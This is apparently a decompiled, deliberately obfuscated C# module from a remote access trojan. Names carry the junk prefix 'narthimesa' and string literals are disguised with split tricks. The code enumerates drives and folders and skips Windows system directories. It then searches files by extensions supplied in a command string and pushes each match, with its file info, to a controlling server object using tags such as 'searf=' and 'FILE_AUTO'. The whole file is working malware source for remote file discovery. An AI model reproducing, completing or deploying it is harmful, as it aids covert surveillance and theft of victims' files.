using System;
using System.Collections.Generic;
using System.IO;

namespace narthimesa;

internal class DRZARIVF
{
	public int narthimesafIndx = 0;

	public bool narthimesareaging = false;

	public List<string> narthimesasFiles = new List<string>();

	public MEADRM iserver;

	public List<string> narthimesafExts = new List<string>();

	public List<string> narthimesanotFilders = new List<string>();

	public string narthimesamainPath;

	public int narthimesasIndx = 0;

	public string narthimesafilesLogs = CEAZRNF.narthimesafilesLogs;

	public bool narthimesaseeAccess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public void narthimesalook_File(string tempStr)
	{
		iserver.narthimesaautCnls = false;
		narthimesafExts.Clear();
		narthimesasFiles.Clear();
		narthimesafIndx = 0;
		narthimesasIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				narthimesafExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			narthimesareaging = true;
			narthimesasend_Search(array[1]);
			narthimesareaging = false;
			iserver.narthimesapush_data(null, "narthimesa@seard=searched|narthimesa".Split(new char[1] { '|' })[0]);
		}
	}

	public IEnumerable<string> narthimesaaddFiles(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.narthimesaautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (narthimesaseeAccess(text) && !narthimesanotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public DRZARIVF()
	{
		narthimesanotFilders.Add("clients_data|narthimesa".Split(new char[1] { '|' })[0]);
		narthimesanotFilders.Add("program files|narthimesa".Split(new char[1] { '|' })[0]);
		narthimesanotFilders.Add("msocache|narthimesa".Split(new char[1] { '|' })[0]);
		narthimesanotFilders.Add("recoveDSDF|narthimesa".Split(new char[1] { '|' })[0]);
		narthimesanotFilders.Add("documents and settings|narthimesa".Split(new char[1] { '|' })[0]);
		narthimesanotFilders.Add("system volume information|narthimesa".Split(new char[1] { '|' })[0]);
		narthimesanotFilders.Add("$recycle.bin|narthimesa".Split(new char[1] { '|' })[0]);
		narthimesanotFilders.Add("windows|narthimesa".Split(new char[1] { '|' })[0]);
		narthimesanotFilders.Add("program files (x86)|narthimesa".Split(new char[1] { '|' })[0]);
		narthimesanotFilders.Add("programdata|narthimesa".Split(new char[1] { '|' })[0]);
	}

	public string narthimesacheck_Folder(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (narthimesaseeAccess(text2))
				{
					text = text + text2 + ">|narthimesa".Split(new char[1] { '|' })[0];
				}
			}
		}
		return text;
	}

	public void narthimesasend_Search(string path)
	{
		try
		{
			foreach (string item in narthimesaaddFiles(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (narthimesafExts.Contains(text.ToLower()))
				{
					string text2 = iserver.narthimesafile_info(item, ret: true);
					iserver.narthimesapush_data(null, "narthimesa@searf=|narthimesa".Split(new char[1] { '|' })[0] + item + "<FILE_AUTO<|narthimesa".Split(new char[1] { '|' })[0] + text2);
				}
				if (iserver.narthimesaautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string narthimesalookup_File(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|narthimesa".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public string narthimesalookup_Drives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|narthimesa".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}
}
